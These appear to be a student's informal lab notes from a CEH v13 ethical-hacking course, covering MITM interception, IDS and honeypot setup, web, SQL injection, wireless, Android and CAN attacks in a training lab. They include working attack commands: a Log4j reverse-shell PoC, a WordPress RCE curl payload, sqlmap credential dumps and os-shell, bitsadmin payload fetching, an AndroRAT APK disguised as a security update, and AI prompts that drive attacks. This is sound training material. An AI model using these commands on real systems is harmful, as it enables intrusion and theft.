  :~$ in another system 
  Open Firefox web browser and navigate to http://10.10.1.11:8080/ca.crt.
  to download the certificate
  Firefox web browser, select Settings 
  earch for Certificates and open View Certificates.
   Authorities tab and click on Import…
Select File containing CA certificate(s) to import
When prompted, click the Trust this CA to identify websites checkbox and click on OK
On the Settings page, search for proxy and open
back to caido
On the Requests tab, for all www.moviescope.com requests, modify www.moviescope.com to www.goodshopping.com in all the captured GET requests and Forward all the requests.
switch back to victim tab and do this until victim see different website
```
</details>

<details>
<summary>Intercept HTTP Traffic using Hetty</summary>

* hetty
```console
:~$ open ceh tool and install hetti tool
in same system web browser
http://localhost:8080
and give a name '
open proxy page from left 3 line
and add the proxy of attacker ip and port 8080
and vist the website and return to attacker machine you can see the passwor enterd in post packet under body
```
</details>


<details>
<summary>Detect session hijacking using Wireshark</summary>

* wireshark
```console
:~$open wireshark as a victim
back to parrot
and open bettercap by
bettercap -iface eth0
there help
and on the module by
net.probe on
 net.recon on
 net.sniff on
 bettercap sends several ARP broadcast requests to the hosts
 ```
 </details>


# Evading IDS,Firewall and Honeypots

<details>
<summary>Perform Intrusion Detection using Various Tools</summary>

* Detect intrusions using Snort
```console
:~$ install the Snort and replace some files in theire (Installation)
Navigate to the etc folder in the specified location, E:\CEH-Tools\CEHv13 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort\snortrules-snapshot-29150\etc of the Snort rules; copy snort.conf and paste it in C:\Snort\etc.

Copy so_rules and prepoc_rules and also rules folder and paste it into C:\Snort





open snort in cmd by

snort
and ctrl c
then 
snort -W
notedown the index number here its 2 
and to enable ethernet interface
>> snort -dev -i 2
leave that cmd open and 
open another cmd and ping google.com to seee that snort is working
```
>Now configure the snort.conf file
```console
:~$ open the file with notepad++
bonus > its in mail which is already configured
```
>or to configuring manually 
```console
:~$ step 1: 
scroll down to the Step #1: Set the network variables section (Line 41) of the snort.conf file. In the HOME_NET line (Line 45), replace any with the IP addresses of the machine (target machine) on which Snort is running. Here, the target machine is Windows 11 and the IP address is 10.10.1.11.

step 2: 
DNS_SERVERS line by replacing $HOME_NET with your DNS Server IP address; otherwise, leave this line as it is. here its 8.8.8.8

step 3:
Scroll down to RULE_PATH (Line 104). In Line 104, replace ../rules with C:\Snort\rules in Line 105, replace ../so_rules with C:\Snort\so_rules and in Line 106, replace ../preproc_rules with C:\Snort\preproc_rules.

step 4:
In Lines 109 and 110, replace ../rules with C:\Snort\rules. Minimize the Notepad++ window.

step 5:
Navigate to C:\Snort\rules, and create two text files; name them white_list and black_list and change their file extensions from .txt to .rules.

step 6:
Switch back to Notepad++, scroll down to the Step #4: Configure dynamic loaded libraries section (Line 238). Configure dynamic loaded libraries in this section.

step 7:
Add the path to dynamic preprocessor libraries (Line 243); replace /usr/local/lib/snort_dynamicpreprocessor/ with your dynamic preprocessor libraries folder location.

In this task, the dynamic preprocessor libraries are located at C:\Snort\lib\snort_dynamicpreprocessor

At the path to base preprocessor (or dynamic) engine (Line 246), replace /usr/local/lib/snort_dynamicengine/libsf_engine.so with your base preprocessor engine C:\Snort\lib\snort_dynamicengine\sf_engine.dll.

Ensure that the dynamic rules libraries (Line 249) is commented out

step 8:
Scroll down to the Step #5: Configure preprocessors section (Line 253), the listed preprocessor. This does nothing in IDS mode, however, it generates errors at runtime.

Comment out all the preprocessors listed in this section by adding '#' and (space) before each preprocessor rule (261-265).

step 9:
Scroll down to line 321 and delete lzma keyword and a (space).

step 10:
Scroll down to Step #6: Configure output plugins (Line 513). In this step, provide the location of the classification.config and reference.config files.

These two files are in C:\Snort\etc. Provide this location of files in the configure output plugins (in Lines 527 and 528) (i.e., C:\Snort\etc\classification.config and C:\Snort\etc\reference.config).

step 11:
In Step #6, add to line (529) 
output alert_fast: alerts.ids:

step 12:
In the snort.conf file, find and replace the ipvar string with var. To do this, press Ctrl+H on the keyboard. The Replace window appears; enter ipvar in the Find what : text field, enter var in the Replace with : text field, and click Replace All.

save snort

step 13:
Navigate to C:\Snort\rules and open the icmp-info.rules file with Notepad++

and add line at last


>> alert icmp $EXTERNAL_NET any -> $HOME_NET 10.10.1.11 (msg:"ICMP-INFO PING"; icode:0; itype:8; reference:arachnids,135; reference:cve,1999-0265; classtype:bad-unknown; sid:472; rev:7;)


then open cmd
 cd C:\Snort\bin
 snort -iX -A console -c C:\Snort\etc\snort.conf -l C:\Snort\log -K ascii
 (replace X with your device index number; in this task: X is 2)
 to start snort

 and open attacker machine and ping
 ping google.com -t (-t continues ping)
 come to snort and observe
 ctrl c

 Go to the C:\Snort\log\10.10.1.19 folder and open the ICMP_ECHO.ids file with Notepad++. You see that all the log entries are saved in the ICMP_ECHO.ids file.
 ```
 </details>

 <details>
 <summary>Deploy Cowrie Honeypot to Detect Malicious Network Traffic</summary>

 * Cowrie setup
 ```console
 :~$ ubuntu with root
  sudo adduser --disabled-password cowrie
  to create a new user with no passwords
  and then copy cowrie folder from ceh tools navigate to honeypot tools


  If ceh-tools on 10.10.1.11 option is not present then follow the below steps to access CEH-Tools folder:

Open Files and navigate to the + Other Locations from the left pane
In the Connect to Server field, type smb://10.10.1.11 and press Enter to access Windows 11 shared folders.
The security pop-up appears; enter the Windows 11 machine credentials (Admin/Pa$$w0rd) and click Connect.
The Windows shares on 10.10.1.11 window appears; double-click the CEH-Tools folder.

```
```console
:~$ open a new terminal with admin
jump to cowrie directory
pip install --upgrade -r requirements.txt 
>> to install required dependencies
then 
chmod -R 777 cowrie

iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
>> to direct all traffic toward 22 to 2222


To facilitate enhanced security measures, run the following commands to configure authbind, enabling the Cowrie honeypot to operate on port 22 without requiring root privileges:

touch /etc/authbind/byport/22
chown cowrie:cowrie /etc/authbind/byport/22
chmod 770 /etc/authbind/byport/22


virtualenv --python=python3 cowrie-env
source cowrie-env/local/bin/activate
```
```console
:~$ exit to exit the root prev
cd cowrie 
bin/cowrie start
 sudo su command and execute cd var/log/cowrie/
  tail cowrie.log 
>> to view log file
```
```console
:~$ in attacker machine i.e parrot
nmap -p- -sV 10.10.1.9
then open putty by putty cmd
enter the target ip
back to ubuntu and run
tail cowrie.log

again switch back to parrot and login to putty
ip and random password and perform some cmd fn there like ls cd pwd whoami etc
again switch back to ubuntu and 
tail cowrie.log
```
</details>

<details>
<summary>Evade Firewall through Windows BITSAdmin</summary>

* Background Intelligent transfer service
```console
:~$ create a payload with help of msfvenom
here we are using BITSAdmin to transfer this file 
for this generate the payload in parrot machine
and go to victim machine
and open windows powershell
bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe
and payload loaded to self
```
</details>

# Hacking WEB server

<details>

<summary>Footprint the Web Server</summary>

* Footprint a web server using Netcat and Telnet
```console
:~$ open parrot
nc -vv www.moviescope.com 80
GET / HTTP/1.0 and press Enter twice.
```

* telnet 
```console
:~$telnet www.moviescope.com 80.
and hit double enter
```
</details>

<details>

<summary>Enumerate Web Server Information using Nmap Scripting Engine (NSE)</summary>

*NSE
```console 
:~$ nmap -sV --script=http-enum [target website]
> www.goodshopping.com

nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- www.goodshopping.com.
```
Perform an HTTP trace on the targeted domain. 

```console
  :~$ nmap --script http-trace -d www.goodshopping.com.
  ```
   check whether Web Application Firewall is configured on the target host or domain.
   ```console
   :~$map -p80 --script http-waf-detect www.goodshopping.com\
   ```
</details>

<details>

<summary> Perform a Web Server Attack</summary>

   * Crack FTP credentials using a Dictionary Attack
   ```console
   :~$ In the terminal window, run nmap -p 21 [IP Address of Windows 11]. (to check is ftp is running or not)

   check if an FTP server is hosted on the Windows 11 machine.

    Run ftp [IP Address of Windows 11]
    and try to connest with random password and exit

    then 
    CEHv13 Module 13 Hacking Web Servers folder and copy Wordlists folder.

In the terminal window, run hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt ftp://[IP Address of Windows 11].
then try to login 
ftp ip
mkdir and check it in victim machine C:FTP

and then
```
```console
:~$ help to see available option
```
</details>

<details>

<summary>Gain Access to Target Web Server by Exploiting Log4j Vulnerability</summary>

* we will install a vulnerable server in the Ubuntu machine
```console
:~$First we need to install docker.io in ubuntu machine, to do that type sudo apt-get update
sudo apt-get install docker.io 
cd log4j-shell-poc/


we need to setup log4j vulnerable server,
docker build -t log4j-shell-poc .       (dot)
-t: specifies allocating a pseudo-tty.       
docker run --network host log4j-shell-poc
>to run the vulnerable server
```
then open parrot
```console
:~$ We will first scan the target machine to identify any vulnerable services running on it.
nmap -sV -sC 10.10.1.9
>-sC option enables the use of default scripts in the Nmap Scripting Engine (NSE)
we can see that Apache is vulnerable to Remote Code Execution
run > searchsploit -t Apache RCE 
>command to view the RCE vulnerabilities on the Apache server.

Click the Firefox icon at the top of Desktop, to open a browser window.

In the address bar of the browser, type http://10.10.1.9:8080 and press Enter.

```
```console
:~$cd log4j-shell-poc/ 
Now, we needed to install JDK 8, to do that open a new terminal window
tar -xf jdk-8u202-linux-x64.tar.gz  
>-xf all files to extract
and we have to move the file
mv jdk1.8.0_202 /usr/bin/
Now, we need to update the installed JDK path in the poc.py file.
pluma poc.py 
line 62, replace jdk1.8.0_20/bin/javac with /usr/bin/jdk1.8.0_202/bin/javac.
line 87 and replace jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java
line 99 and replace jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java.
open a new terminal window and type nc -lvp 9001 
Switch to previous terminal window and type python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001
Now, copy the payload generated in the send me: section
Firefox browser window, in Username field paste the payload that was copied and type password randomly
Now switch to the netcat listener, 
```
</details>

<details>
<summary>with ai</summary>

* sgpt
```console
:~$ sgpt --shell "Perform a directory traversal on target url https://certifiedhacker.com using gobuster"
```
brute force attack
```console
:~$ o perform FTP bruteforce attack run sgpt --shell "Attempt FTP login on target IP 10.10.1.11 with hydra using usernames and passwords file from /home/attacker/Wordlists"
```
webserver footprinting
```console
:~$ gpt --shell "Perform webserver footprinting on target IP 10.10.1.22" 
```
webserver footprinting
```console
:~$ sgpt --shell "Perform web server footprinting on target IP 10.10.1.22 using Netcat by sending an HTTP request and analyzing the response." 
```
website mirroring
```console
:~$ sgpt --shell "Mirror the target website certifiedhacker.com" 
also sgpt --shell "Mirror the target website https://certifiedhacker.com with httrack on desktop"

```
</details>

# Hacking web application
<details>
<summary>Footprint the Web Infrastructure</summary>

* Perform Web Application Reconnaissance using Nmap and Telnet

```console
:~$ nmap -T4 -A -v [Target Web Application]
>www.moviescope.com
>T4: specifies setting time template
```
* By telnet to perform banner grabbing
```console
:~$ telnet www.moviescope.com 80
 type GET / HTTP/1.0 and press Enter two times.
 > application to devolop a web server ASP.NET
 ```
 </details>

 <details>
 <summary>Perform Web Spidering using OWASP ZAP</summary>
 OWASP ZED Application Proxy

 ```console
 :~$to lounch "zaproxy"

 * Do you want to persist the ZAP Session? appears; select the No, I do not want to persist this session at this moment in time radio button and click Start.
 * The OWASP ZAP main window appears. Under the Quick Start tab, click the Automated Scan option under Welcome to OWASP ZAP.
 * enter the target website under the URL to attack field (here, www.moviescope.com). Leave the other settings to default and click the Attack button.
 * You can observe various URLs under the Spider tab.
 * After performing web spidering, OWASP ZAP performs active scanning. Navigate to the Active Scan tab to observe the various scanned links.
 * Alerts tab, displaying the various vulnerabilities and issues associated with the target
 * click on the Spider tab from the lower section of the window to view the web spidering information. By default, the URLs tab appears under the Spider tab.
 * navigate to the Messages tab under the Spider tab to view more detailed information
 ```
 </details>

 <details>
 <summary> Perform Web Application Vulnerability Scanning using SmartScanner </summary>
 ```console
:~$windows 11
on the Desktop. Search smartscanner in the search field, 
Under REFERENCES section, press Ctrl and click on CWE-319 hyperlink .
```
</details>

<details>
<summary>Perform Web Application Attacks</summary>

* Perform a Brute-force Attack using Burp Suite
```console
:~$ Ensure that the Wampserver is running in Windows Server 2022 machine. To run the WampServer, execute the following steps:
* click Type here to search field on the Desktop, search for wampserver64
* in parrot
Mozilla Firefox web browser and go to http://10.10.1.22:8080/CEH/wp-login.php?.
Now, we shall set up a Burp Suite proxy by first configuring the proxy settings of the browser
in browser go to setting and search for proxy
* The Connection Settings window appears; select the Manual proxy configuration radio button and specify the HTTP Proxy as 127.0.0.1 and the Port as 8080. Tick the Also use this proxy for HTTPS checkbox and click OK. Close the Settings tab and minimize the browser window.
* Now, minimize the browser window, click the Applications menu form the top left corner of Desktop, and navigate to Pentesting --> Web Application Analysis --> Web Application Proxies --> Burpsuite CE to launch the Burpsuite CE application.
* The Burp Suite main window appears; click the Proxy tab from the available options in the top section of the window.
Turn the interception on if it is off.
* Switch back to the browser window. On the login page of the target WordPress website, type random credentials, here admin and password. Click the Log In button.
* Now, right-click anywhere on the HTTP request window, and from the context menu, click Send to Intruder.
then go to intruder tab
Click the Clear § button from the right-pane to clear the default payload values.
* Once you clear the default payload values, select Cluster bomb from the Attack type drop-down list.
* now we have to add the & symbol to both username and password like &user& &password& by using add button
Once the username and password payloads are added. The symbol '§' will be added at the start and end of the selected payload values.
* Navigate to the Payloads tab under the Intruder tab and ensure that under the Payload Sets section, the Payload set is selected as 1, and the Payload type is selected as Simple list.
* Under the Payload settings [Simple list] section, click the Load… button.
* A file selection window appears; navigate to the location /home/attacker/Desktop/CEHv13 Module 14 Hacking Web Applications/Wordlist, select the username.txt file, and click the Open button.
* Similarly, load a password file for the payload set 2. To do so, under the Payload Sets section, select the Payload set as 2 from the drop-down options and ensure that the Payload type is selected as Simple list.
the do the same here select password file
* then hit start attack
* After the progress bar completes, scroll down and observe the different values of Status and Length. Here, Status=302 and Length= 1155.
thats the right password admin and qwerty@123
```
</details>
<details>
<summary>Perform Remote Code Execution (RCE) Attack</summary>

```console
:~$ windows server 2022
Click Type here to search field on the Desktop, search for wampserver64 in the search bar and select Wampserver64 from the results.
click on hidden icon and make sure that wampserver64 is running
Now, open any web browser, and go to http://10.10.1.22:8080/CEH/wp-login.php? (here, we are using Mozilla Firefox).
here we are opened as victim
Hover your mouse cursor on Plugins in the left pane and click Installed Plugins, as shown in the screenshot.
In the Plugins page, observe that User Post Gallery is installed. Click Activate under the User Post Gallery plugin to activate the plugin.
* switch to parrot security machine
Open Mozilla Firefox web browser and go to https://wpscan.com/ and login to the wpscan account that you have created in previous task.
that is register yourself to wpscan and free use
copy the api token
* open parrot security machine and super user and cd
*In the Terminal window, run wpscan --url http://10.10.1.22:8080/CEH --api-token [API Token from Step#13] command.
as we identified RCE (remote code execution) now we are exploiting it
* To perform RCE attack, run curl -i 'http://10.10.1.22:8080/CEH/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:whoami:NULL:NULL' command.
```
</details>
<details>
<summary>Detect Web Application Vulnerabilities using Various Web Application Security Tools</summary>

* Detect web application vulnerabilities using wapiti web application security scanner
```console
:~$in parrot machine
terminal window run cd wapiti command to navigate into wapiti directory and 
run python3 -m venv wapiti3 
Now, run . wapiti3/bin/activate   (.)
Run pip install . command to install wapiti web application security scanner. (.)
After installing the tool run wapiti -u https://www.certifiedhacker.com
to see scanned report
 cd /root/.wapiti/generated_report/
 ls
 cp certifiedhacker.com_xxxxxxxx_xxxx.html /home/attacker/ 
 Open a new terminal and run firefox certifiedhacker.com_xxxxxxxx_xxxx.html
 ```
 </details>
 <details>
 <summary>with AI</summary>

 ```console
 :~$ --shell "Check if the target url www.certifiedhacker.com has web application firewall"** command to detect WAF using ShellGPT.

 sgpt --shell "Check if the target url https://www.certifiedhacker.com is protected with web application firewall using wafwoof"

 sgpt --shell "Use load balancing detector on target domain yahoo.com." 

 To identify server side technologies using ShellGPT run sgpt --chat HWA --shell "Launch whatweb on the target website www.moviescope.com to perform website footprinting. Run a verbose scan and print the output. Save the results in file whatweb_log.txt." command.

 gpt --shell "Perform the Vulnerability scan on the target url www.moviescope.com"

 sgpt --shell "Perform the Vulnerability scan on the target url www.moviescope.com using nmap"

 To perform a vulnerability scan on web application using Sniper tool run sgpt --shell "Use Sn1per tool and scan the target url www.moviescope.com for web vulnerabilities and save result in file scan3.txt" command.

 To identify files of a web application run sgpt --shell "Scan the web content of target url www.moviescope.com using Dirb" 

 sgpt --shell "Scan the web content of target url www.moviescope.com using Gobuster" >> to identify directories


 To perform FTP bruteforce attack run sgpt --shell "Attempt FTP login on target IP 10.10.1.11 with hydra using usernames and passwords file from /home/attacker/Wordlists" 

 Run sgpt --chat wah --shell "create and run a custom script for web application footprinting and vulnerability scanning. The target url is www.certifiedhacker.com" to automate web application hacking tasks with custom scripts.


To create a custom python script for web application scanning run sgpt --chat wah --shell "create and run a custom python script for web application footprinting and vulnerability scanning. The target url is www.certifiedhacker.com" command.

To create a custom python script for web application scanning run sgpt --chat wah --shell "create and run a custom python script which will run web application footprinting tasks to gather information and then use this information to perform vulnerability scanning on target url is www.certifiedhacker.com" 

To perform Web application fuzz testing using ShellGPT run sgpt --shell "Fuzz the target url www.moviescope.com using Wfuzz tool" 

```
</details>

# SQL Injection
<details>
<summary>Perform an SQL injection attack against MSSQL to extract databases using sqlmap</summary>

```console
:~$parrot
Navigate to http://www.moviescope.com/. A Login page loads; enter the Username and Password as sam and test,
hit on view profile and make a note of url
and then inspect the web page and console
and then type document.cookie in left low corner >>
copy the message
and parrot cmd and type
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="cookie value that you copied" --dbs
here -u > url
and --dbs > enumerating dbms
and move with Yes further
and now we getting table information
```
```console
:~$sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" -D moviescope --tables
-D > enumerating DBMS
--tables > enumerating tables inside db

now to see the content inside the particular table
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" -D moviescope -T User_Login --dump 
--dump > to dump the result
```
```console
:~$ now to interact with os with shell

sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" --os-shell
enter "hostname"
>to get name of the machine
tasklist
>to get the task details on the system
help command for other cmds
```
</details>
<details>
<summary>Detect SQL Injection Vulnerabilities using Various SQL Injection Detection Tools</summary>

* Detect SQL Injection Vulnerabilities using OWASP ZAP

```console
:~$ windows server 2019 machine
search for zap in search bar
no to radio button
and start automated scan
type url www.moviescope.com
expand sql injection in alert tab
and on right side it will show required info

```
</details>
<details>
<summary>Perform SQL Injection using AI</summary>

```console
:~$ ai commands
```
</details>

# Hacking wireless network
<details>
<summary>Perform Wireless Traffic Analysis</summary>


* Wi-Fi packet analysis using Wireshark
```console
:~$ open wireshark
Wireshark: Open Capture File window appears, navigate to E:\CEH-Tools\CEHv13 Module 16 Hacking Wireless Networks\Sample Captures, select WPA2crack-01.cap and click Open.
```
</details>
<details>
<summary>Perform Wireless Attacks</summary>

* Crack a WPA2 network using Aircrack-ng
```console
:~$paroot
 CEHv13 Module 16 Hacking Wireless Networks folder and copy Sample Captures and Wordlist folders.
 and open terminal
  aircrack-ng -a2 -b [Target BSSID] -w /home/attacker/Desktop/Wordlist/password.txt '/home/attacker/Desktop/Sample Captures/WPA2crack-01.cap'.

  -a is the technique used to crack the handshake, 2=WPA technique.
-b refers to bssid; replace with the BSSID of the target router.
-w stands for wordlist; provide the path to a wordlist.
you will get key
```
</details>

# Hacking mobile platform
<details>
<summary>Hack Android Devices</summary>

* Exploit the Android Platform through ADB using PhoneSploit-Pro
```console
:~$ parrot machine n targetting android
cd PhoneSploit-Pro
and run
python3 phonesploitpro.py
go through the options and
Note down the location of images.jpeg (in this example, /sdcard/Download/images.jpeg). You can download the file by selecting option 8 in the PhoneSploit Pro main menu options. for download the image file
In the Terminal window, type N and press Enter to navigate to additional PhoneSploit-Pro options 

At the Main Menu prompt, type 23 and press Enter to choose Open a Link on Device.

When prompted to Enter URL, type the desired URL (in this case, https://pranx.com/hacker/) and press Enter.
Now, at the Main Menu prompt, type 27 and press Enter to choose the Get Device Information 
```

* Hack an Android Device by Creating APK File using AndroRAT
```console
:~$  cd AndroRAT 
python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk
--build: is used for building the APK
-i: specifies the local IP address (here, 10.10.1.13)
-p: specifies the port number (here, 4444)
-o: specifies the output APK file (here, SecurityUpdate.apk)
cp /home/attacker/AndroRAT/SecurityUpdate.apk /var/www/html/share/
```
```console
:~$ if share folder is not present
Run mkdir /var/www/html/share command to create a shared folder
Run chmod -R 755 /var/www/html/share command
Run chown -R www-data:www-data /var/www/html/share command

service apache2 start
then to listen
run python3 androRAT.py --shell -i 0.0.0.0 -p 4444
--shell: is used for getting the interpreter
-i: specifies the IP address for listening (here, 0.0.0.0)
-p: specifies the port number (here, 4444)

and open andorid
chrome
http://10.10.1.13/share
and download apk
and go back to AndroRAT listning
and type
help
and type required options to get info
```
</details>
<details>
<summary>Secure Android Devices from Malicious Apps using AVG</summary>

```console
:~$ Open SVG app in android
and scan for threat
```
</details>

# Iot and OT hacking

<details>

<summary>Perform Footprinting using Various Footprinting Techniques</summary>

* through online
```console
:~$ Launch any web browser, go to https://www.whois.com/whois
 type www.oasis-open.org
 and then look for the details
 and 
 open a new tab, and go to https://www.exploit-db.com/google-hacking-database.
 Google Hacking Database page appears; type SCADA 
 Open a new tab and go to https://www.google.com. In the search field, enter "login" intitle:"scada login".
 you can use advanced search operators such as intitle:"index of" scada
 then go to shodan
 Shodan main page appears; type port:1883
 additional filters
 Search for Modbus-enabled ICS/SCADA systems:

port:502

Search for SCADA systems using PLC name:

"Schneider Electric"

Search for SCADA systems using geolocation:

SCADA Country:"US"
```
</details>

<details>

<summary>Capture and analyze IoT traffic using Wireshark</summary>

 
```console
:~$ to install MQTT Broker on the Windows Server 2019
Navigate to Z:\CEHv13 Module 18 IoT and OT Hacking\Bevywise IoT Simulator folder and double-click on the Bevywise_MQTTRoute_4.exe
run it 
To create IoT devices, we must install the IoT simulator on the client machine.
navigate to server 2022 machine
Z:\CEHv13 Module 18 IoT and OT Hacking\Bevywise IoT Simulator folder and double-click on the Bevywise_IoTSimulator_3.exe
 Bevywise IoT Simulator is installed successfully. To launch the IoT simulator, navigate to the C:\Bevywise\IotSimulator\bin directory and double-click on the runsimulator.bat file.
 (http://127.0.0.1:9000/setnetwork?network=HEALTH_CARE)

```
```console
:~$ we will create a virtual IoT network and virtual IoT devices. Click on the menu icon and select the +New Network
In the next screen, we will setup the Simulator Settings. Set the Broker IP Address as 10.10.1.19 (the IP address of the Windows Server 2019 ). Since we have installed the Broker on the web server
Add blank Device
 Create New Device popup opens. Type the device name (here, we use Temperature_Sensor), enter Device Id (here, we use TS1), 
 To connect the Network and the added devices to the server or Broker, click on the Start Network red color circular icon in right corner.
Next, switch to the Windows Server 2019 machine. Open a web browser, and go to http://localhost:8080 and login using admin/admin
you can see device in recent connection
switch back to windows 22 server
Next, we will create the Subscribe command for the device Temperature_Sensor.
Click on the Plus icon in the top right corner and select the Subscribe to Command option.
The Subscribe for command - TS1 popup opens. Select On start under the Subscribe on tab, type High_Tempe under the Topic tab, and select 1 Atleast once below the Qos option.
inimise the Edge browser. Click Type here to search field on the Desktop, search for wireshark
The Wireshark Application window appears, select the Ethernet as interface. which having system ip
Leave the IoT simulator running and switch to the Windows Server 2019 machine.

Navigate to Devices menu and click on connected device i.e.TS1.
```

```console
:~$ Now, we will send the command to TS1 using the High_Tempe topic.

 Send Command section, select Topic as High_Tempe, type Alert for High Temperature in Message field and click on the Submit button.
 Next, switch to Windows Server 2022 machine.
  verify the communication, we have executed Wireshark application, switch to the Wireshark traffic capturing window.
  mqtt under the filter field and press Enter. To display only the MQTT

  Select any Publish Message packet from the Packet List pane. In the Packet Details pane at the middle of the window, expand the Transmission Control Protocol, MQ Telemetry Transport Protocol, and Header Flags nodes.

  (Note: After establishing a successful connection with the MQTT broker, the MQTT client can publish messages. The headers in the Publish Message packet are given below:

Header Flags: Contains information regarding the MQTT control packet type.
DUP flag: If the DUP flag is 0, it indicates the first attempt at sending this PUBLISH packet; if the flag is 1, it indicates a possible re-attempt at sending the message.
QoS: Determines the assurance level of a message.
Retain Flag: If the retain flag is set to 1, the server must store the message and its QoS, so it can cater to future subscriptions matching the topic.
Topic Name: Contains a UTF-8 string that can also include forward slashes when it needs to be hierarchically structured.
Message: Contains the actual data to be transmitted.
Payload: Contains the message that is being published.)



Select any Publish Release packet from the Packet List pane. In the Packet Details pane at the middle of the window, expand the Transmission Control Protocol, MQ Telemetry Transport Protocol, and Header Flags nodes.
(Note: A Publish Release (PUBREL) packet is the response to a Publish Received (PUBREC) packet.)

Now, scroll down, look for the Publish Complete packet from the Packet List pane, and click on it. In the Packet Details pane at the middle of the window, expand the Transmission Control Protocol, MQ Telemetry Transport Protocol, and Header Flags nodes.

(Note: The Publish Complete (PUBCOMP) packet is the response to a Publish Release (PUBREL) packet.)

Now, scroll down, look for the Publish Received packet from the Packet List pane, and click on it. In the Packet Details pane at the middle of the window, expand the Transmission Control Protocol, MQ Telemetry Transport Protocol, and Header Flags nodes.
```

</details>
<details>

<summary>Perform Replay Attack on CAN Protocol</summary>

```console
:~$ Controller Area Network (CAN)
open ubuntu and cmd
Now, to setup a virtual CAN interface issue following commands:

sudo modprobe can
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0

and to confirm ifconfig and you can see vcan0 interface
and then 
Run chmod -R 777 ICSim
Now, run cd ICSim to navigate to ICSim directory and execute "make" command to create two executable files for IC Simulator and CANBus Control Panel.
Run ./icsim vcan0 to start the ICSim simulator.
Open a new terminal tab and execute sudo su
Navigate to ICSim directory to do so run cd ICSim/.
Execute ./controls vcan0 to start the CANBus Control Panel. 
```
```console
:~$ Now, we will start sniffer to capture the traffic sent to the ICSim Simulator by CANBus control panel simulator. To do so, open a new terminal tab and execute sudo su
Navigate to ICSim directory to do so run cd ICSim/.
Execute "cansniffer -c vcan0 " to start sniffing

Open a new terminal and execute sudo su 
Navigate to ICSim directory
To capture the logs run candump -l vcan0. (L)

(Use the following keys to perform various functions

ICSim Functions	Keys
Accelerate	Up arrow
Left/Right Turn	Left arrow/ Right arrow
Unlock Rear Left/Right doors	Right Shift + X / Right Shift + Y
Unlock Front Left/Right doors	Right Shift +A / Right Shift + B
Lock all doors	Hold Right Shift key + Tap Left Shift
Unlock all doors	Hold Left Shift key + Tap Right Shift)



Now, to perform replay attack, run canplayer -I candump-2024-05-07_063502.log and press enter.
you can see the variation in simulater
```
</details>
